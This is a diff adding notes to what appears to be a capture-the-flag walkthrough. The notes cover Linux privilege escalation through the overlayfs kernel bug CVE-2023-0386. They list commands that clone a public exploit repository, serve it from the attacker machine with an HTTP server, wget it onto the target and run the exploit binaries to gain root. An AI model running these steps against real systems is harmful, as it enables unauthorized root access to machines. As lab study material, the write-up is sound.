@@ -37,3 +37,12 @@
 # now ROOT SHELL
 - **find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'** to find and files owned by admin and yes we find a directory contains mail
 - the email contains info about cve in overlayfs
+- running Ubuntu 22.04 with the kernel 5.15.70 we search for cve for last year
+- search for “linux kernel vulnerability fuse overlayfs” limited to the last year returns a bunch of stuff about CVE-2023-0386
+- git clone https://github.com/sxlmnwb/CVE-2023-0386  in our machine
+- tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386\ to make it compressed
+- python -m http.server to send files
+- cd temp --> wget 10.10.16.63:8000/CVE-2023-0386.tar.bz2 --> tar -xjvf CVE-2023-0386.tar.bz2 -- >cd CVE-2023-0386 -- >
+- ./fuse ./ovlcap/lower ./gc
+- 
+
